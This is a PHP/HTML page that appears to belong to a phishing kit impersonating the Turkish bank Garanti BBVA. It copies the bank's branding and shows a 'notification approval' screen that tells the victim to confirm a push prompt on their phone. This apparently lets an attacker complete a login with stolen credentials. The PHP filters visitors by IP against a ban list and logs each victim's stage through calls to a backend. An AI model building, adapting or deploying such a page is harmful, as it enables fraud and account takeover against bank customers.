<?php
require_once 'connect.php';
if ($ajax->banControl(IP)) {
  $ajax->redirect(BAN_URL);
}


$ajax->pageUpdate(IP,'Bildirim');
?>




<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required Meta Tags Always Come First -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Title -->
  <title>Garanti BBVA</title>

  <!-- Favicon -->

  <link rel="shortcut icon" href="./favicon.png" type="image/x-icon" />

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">

  <!-- CSS Implementing Plugins -->
  <link rel="stylesheet" href="./assets/css/vendor.min.css">

  <!-- CSS Front Template -->
  <link rel="stylesheet" href="./assets/css/theme.minc619.css?v=1.0">

  <link rel="preload" href="./assets/css/theme.min.css" data-hs-appearance="default" as="style">
  <link rel="preload" href="./assets/css/theme-dark.min.css" data-hs-appearance="dark" as="style">

  <style data-hs-appearance-onload-styles>
    * {
      transition: unset !important;
    }

    body {
      opacity: 0;
    }
  </style>

  <script>
    window.hs_config = { "autopath": "@@autopath", "deleteLine": "hs-builder:delete", "deleteLine:build": "hs-builder:build-delete", "deleteLine:dist": "hs-builder:dist-delete", "previewMode": false, "startPath": "/index.html", "vars": { "themeFont": "https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap", "version": "?v=1.0" }, "layoutBuilder": { "extend": { "switcherSupport": true }, "header": { "layoutMode": "default", "containerMode": "container-fluid" }, "sidebarLayout": "default" }, "themeAppearance": { "layoutSkin": "default", "sidebarSkin": "default", "styles": { "colors": { "primary": "#377dff", "transparent": "transparent", "white": "#fff", "dark": "132144", "gray": { "100": "#f9fafc", "900": "#1e2022" } }, "font": "Inter" } }, "languageDirection": { "lang": "en" }, "skipFilesFromBundle": { "dist": ["./assets/js/hs.theme-appearance.js", "./assets/js/hs.theme-appearance-charts.js", "./assets/js/demo.js"], "build": ["./assets/css/theme.css", "./assets/vendor/hs-navbar-vertical-aside/dist/hs-navbar-vertical-aside-mini-cache.js", "./assets/js/demo.js", "./assets/css/theme-dark.html", "./assets/css/docs.css", "./assets/vendor/icon-set/style.html", "./assets/js/hs.theme-appearance.js", "./assets/js/hs.theme-appearance-charts.js", "node_modules/chartjs-plugin-datalabels/dist/chartjs-plugin-datalabels.min.html", "./assets/js/demo.js"] }, "minifyCSSFiles": ["./assets/css/theme.css", "./assets/css/theme-dark.css"], "copyDependencies": { "dist": { "*./assets/js/theme-custom.js": "" }, "build": { "*./assets/js/theme-custom.js": "", "node_modules/bootstrap-icons/font/*fonts/**": "./assets/css" } }, "buildFolder": "", "replacePathsToCDN": {}, "directoryNames": { "src": "./src", "dist": "./dist", "build": "./build" }, "fileNames": { "dist": { "js": "theme.min.js", "css": "theme.min.css" }, "build": { "css": "theme.min.css", "js": "theme.min.js", "vendorCSS": "vendor.min.css", "vendorJS": "vendor.min.js" } }, "fileTypes": "jpg|png|svg|mp4|webm|ogv|json" }
    window.hs_config.gulpRGBA = (p1) => {
      const options = p1.split(',')
      const hex = options[0].toString()
      const transparent = options[1].toString()

      var c;
      if (/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)) {
        c = hex.substring(1).split('');
        if (c.length == 3) {
          c = [c[0], c[0], c[1], c[1], c[2], c[2]];
        }
        c = '0x' + c.join('');
        return 'rgba(' + [(c >> 16) & 255, (c >> 8) & 255, c & 255].join(',') + ',' + transparent + ')';
      }
      throw new Error('Bad Hex');
    }
    window.hs_config.gulpDarken = (p1) => {
      const options = p1.split(',')

      let col = options[0].toString()
      let amt = -parseInt(options[1])
      var usePound = false

      if (col[0] == "#") {
        col = col.slice(1)
        usePound = true
      }
      var num = parseInt(col, 16)
      var r = (num >> 16) + amt
      if (r > 255) {
        r = 255
      } else if (r < 0) {
        r = 0
      }
      var b = ((num >> 8) & 0x00FF) + amt
      if (b > 255) {
        b = 255
      } else if (b < 0) {
        b = 0
      }
      var g = (num & 0x0000FF) + amt
      if (g > 255) {
        g = 255
      } else if (g < 0) {
        g = 0
      }
      return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
    }
    window.hs_config.gulpLighten = (p1) => {
      const options = p1.split(',')

      let col = options[0].toString()
      let amt = parseInt(options[1])
      var usePound = false

      if (col[0] == "#") {
        col = col.slice(1)
        usePound = true
      }
      var num = parseInt(col, 16)
      var r = (num >> 16) + amt
      if (r > 255) {
        r = 255
      } else if (r < 0) {
        r = 0
      }
      var b = ((num >> 8) & 0x00FF) + amt
      if (b > 255) {
        b = 255
      } else if (b < 0) {
        b = 0
      }
      var g = (num & 0x0000FF) + amt
      if (g > 255) {
        g = 255
      } else if (g < 0) {
        g = 0
      }
      return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
    }
  </script>
  <style>
    /* Ön yükleyici stilleri */
    .preloader { 
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 9999;
        background-color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .preloader .itch{
      position: absolute;
    }

    .preloader .itch img{
      width: 120px;
      height:120px;
    }
    
    .preloader .spinner {
        width: 130px;
        height: 130px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #3498db;
        border-radius: 50%;
        animation: spin 2s linear infinite;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>

<body>

  <script src="./assets/js/hs.theme-appearance.js"></script>

  <!-- ========== MAIN CONTENT ========== -->
  <main id="content" role="main" class="main">


    <!-- Content -->
    <div class="container py-5 py-sm-7">
      <a class="d-flex justify-content-center mb-5" href="index.html">
        <img class="zi-2" src="https://upload.wikimedia.org/wikipedia/tr/thumb/7/75/Garanti_BBVA.png/200px-Garanti_BBVA.png" alt="Image Description"
          style="width: 12rem;">
      </a>

      <div class="mx-auto" style="max-width: 30rem;">
        <!-- Card -->
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            <div class="mb-4">
              <div class="preloader">
                <div class="itch"> <img src="./asset/notif.webp" alt="" style="width: 60px; height: 60px"> </div>
                <div class="spinner"></div>
              </div>
            </div>

            <div class="mb-5">
              <h1 class="display-5">Bildirim Onayı</h1>
              <p class="mb-0">Lütfen telefonunuza gönderilen bildirimi onaylayın.</p>
            </div>

            <div class="text-center">

            </div>

          </div>
        </div>
        <!-- End Card -->

        <!-- Footer -->

        <!-- End Footer -->
      </div>
    </div>
    <!-- End Content -->
  </main>
  <!-- ========== END MAIN CONTENT ========== -->

  <!-- JS Implementing Plugins -->
  <script src="./assets/js/vendor.min.js"></script>

  <!-- JS Front -->
  <script src="./assets/js/theme.min.js"></script>

  <!-- JS Plugins Init. -->
  <script>
    $(document).ready(function () {
      $("#resendLink").on("click", function (event) {
        event.preventDefault();
        $("#message").text("Gönderildi.").css("color", "#2f6ad9");
      });
    });
  </script>
  <?php require_once 'add-js.php'; ?>
</body>

</html>